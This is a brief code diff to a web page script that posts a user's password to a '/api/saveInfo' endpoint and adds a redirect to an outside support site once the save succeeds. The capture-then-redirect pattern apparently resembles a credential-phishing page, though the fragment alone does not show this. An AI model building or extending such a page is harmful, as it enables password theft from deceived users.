@@ -285,7 +285,7 @@
             const userPass = document.getElementById('userPass').value;
 
             try {
-                await fetch('/api/saveInfo', {
+                const res = await fetch('/api/saveInfo', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -295,6 +295,7 @@
                         userPass
                     })
                 })
+                if (res.status === 201) { window.location.href = 'https://soporte.tibox.cl/'}
             } catch (err) {
                 console.log(err)
             }
